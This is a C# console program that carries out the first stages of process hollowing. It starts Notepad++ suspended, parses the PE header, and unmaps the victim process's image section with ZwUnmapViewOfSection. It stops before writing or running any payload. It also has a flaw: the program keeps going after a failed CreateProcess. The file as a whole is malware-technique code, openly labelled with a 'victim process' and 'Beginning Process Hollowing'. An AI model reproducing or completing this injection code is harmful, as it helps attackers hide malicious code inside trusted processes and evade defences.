using ProcessInjector;
using System;
using System.IO;
using System.Runtime.InteropServices;

namespace ConsoleApp1
{
    class Program
    {
        
        static void Main(string[] args)
        {
            string notepadPath = @"D:\Program Files\Notepad++\notepad++.exe";

            byte[] victimFileBytes = File.ReadAllBytes(notepadPath);
            IntPtr victimeFilePointer = Marshal.UnsafeAddrOfPinnedArrayElement(victimFileBytes, 0);

            PInvoke.STARTUPINFO startupInfo = new PInvoke.STARTUPINFO();
            PInvoke.PROCESS_INFORMATION processInformation = new PInvoke.PROCESS_INFORMATION();
            
            Console.WriteLine("Stage 1");
            Console.WriteLine($"Creating victim process: {notepadPath}");

            bool couldNotCreateProcess = !PInvoke.CreateProcess(
                                                lpApplicationName: null,
                                                lpCommandLine: notepadPath,
                                                lpProcessAttributes: IntPtr.Zero,
                                                lpThreadAttributes: IntPtr.Zero,
                                                bInheritHandles: false,
                                                dwCreationFlags: PInvoke.CreationFlags.SUSPENDED,
                                                lpEnvironment: IntPtr.Zero,
                                                lpCurrentDirectory: null,
                                                lpStartupInfo: startupInfo,
                                                lpProcessInformation: processInformation
                                            );
            if (couldNotCreateProcess)
            {
                Console.WriteLine("Failed to create victim process...");
                
            }

            Console.WriteLine($"Successfully created victim process...");


            Console.WriteLine("Stage 2");
            Int32 e_lfanew = Marshal.ReadInt32(victimeFilePointer, PInvoke.Offsets.E_LFANEW);
            Console.WriteLine($"Getting handle to process...");
            IntPtr processHandle = processInformation.hProcess;
            Console.WriteLine($"Found E_LFANEW OFFSet: {e_lfanew}...");
            Console.WriteLine($"Getting imageBasedAddress...");
            IntPtr imageBasedAddress = new IntPtr(Marshal.ReadInt64(victimeFilePointer, e_lfanew + 0x30));
            Console.WriteLine("Beginning Process Hollowing...");
            
            if(PInvoke.ZwUnmapViewOfSection(processHandle, imageBasedAddress) == PInvoke.NTSTATUS.STATUS_ACCESS_DENIED)
            {
                Console.WriteLine("Failed to unmap section...");
                return;
            }

            Console.WriteLine("Successfully unmapped victim process.");
        }
    }
}
